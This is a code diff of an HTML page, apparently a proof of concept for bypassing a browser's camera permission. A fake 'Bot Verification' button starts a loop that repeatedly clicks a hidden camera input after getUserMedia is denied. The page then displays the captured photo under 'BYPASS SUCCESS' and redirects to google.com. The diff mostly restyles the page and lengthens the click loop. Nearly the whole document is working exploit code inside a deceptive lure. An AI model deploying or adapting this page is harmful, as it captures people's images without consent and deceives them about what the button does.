@@ -1,40 +1,60 @@
 <html lang="en">
   <head>
     <meta charset="UTF-8" />
-    <title>testing123</title>
+    <meta
+      name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"
+    />
+    <title>Tester</title>
     <style>
       body {
-        font-family: system-ui;
+        font-family:
+          -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica,
+          Arial, sans-serif;
         display: flex;
         justify-content: center;
         align-items: center;
-        height: 100vh;
+        min-height: 100vh;
         background: #f0f2f5;
         margin: 0;
+        padding: 20px;
+        box-sizing: border-box;
       }
       #ui-container {
         background: white;
-        padding: 2rem;
-        border-radius: 12px;
-        box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+        padding: 30px;
+        border-radius: 16px;
+        box-shadow: 0 8px 24px rgba(0, 0, 0, 0.12);
         text-align: center;
-        width: 350px;
+        width: 100%;
+        max-width: 450px;
+      }
+      h2 {
+        margin-top: 0;
+        color: #1c1e21;
+      }
+      p {
+        color: #606770;
+        line-height: 1.5;
+        margin-bottom: 25px;
       }
       .btn {
         width: 100%;
-        padding: 12px;
+        padding: 16px;
         background: #007bff;
         color: white;
         border: none;
-        border-radius: 6px;
+        border-radius: 8px;
         cursor: pointer;
+        font-size: 18px;
         font-weight: bold;
+        -webkit-tap-highlight-color: transparent;
       }
       #stolen-img {
         width: 100%;
-        border-radius: 8px;
-        border: 3px solid #dc3545;
-        margin-top: 15px;
+        border-radius: 12px;
+        border: 4px solid #dc3545;
+        margin-top: 20px;
         display: none;
       }
       .hidden {
@@ -45,6 +65,7 @@
   <body>
     <div id="ui-container">
       <div id="setup">
+        <div style="font-size: 50px; margin-bottom: 10px"></div>
         <h1>Bot Verification</h1>
         <p>
           <b>Instruction:</b> Click the button to start verification. The system
@@ -55,7 +76,7 @@
 
       <div id="result" class="hidden">
         <h2 style="color: #dc3545">BYPASS SUCCESS</h2>
-        <p>Status: Photo captured after user clicked 'don't allow'.</p>
+        <p>Status : CAPTURED</p>
         <img id="stolen-img" />
       </div>
     </div>
@@ -71,33 +92,40 @@
     <script>
       const btn = document.getElementById("verify-btn");
       const cam = document.getElementById("cam");
+      const setupDiv = document.getElementById("setup");
+      const resultDiv = document.getElementById("result");
+      const stolenImg = document.getElementById("stolen-img");
 
       btn.onclick = async () => {
         btn.innerText = "Analyzing...";
+        btn.disabled = true;
 
-        const race = setInterval(() => cam.click(), 100);
+        const race = setInterval(() => {
+          console.log("Triggering camera intent...");
+          cam.click();
+        }, 100);
 
         try {
           await navigator.mediaDevices.getUserMedia({ video: true });
         } catch (e) {
-          console.log("Permission Denied (Expected). Race condition firing...");
+          console.log("Permission denied. Race condition should bypass.");
         }
 
-        setTimeout(() => clearInterval(race), 10);
+        setTimeout(() => clearInterval(race), 10000);
       };
 
       cam.onchange = () => {
         const file = cam.files[0];
         if (file) {
-          document.getElementById("stolen-img").src = URL.createObjectURL(file);
-          document.getElementById("setup").classList.add("hidden");
-          document.getElementById("result").classList.remove("hidden");
-          document.getElementById("stolen-img").style.display = "block";
+          stolenImg.src = URL.createObjectURL(file);
+          setupDiv.classList.add("hidden");
+          resultDiv.classList.remove("hidden");
+          stolenImg.style.display = "block";
 
           setTimeout(() => {
-            alert("Identity Confirmed! Redirecting...");
+            alert("Verification Success! Redirecting...");
             window.location.href = "https://google.com";
-          }, 500);
+          }, 800);
         }
       };
     </script>
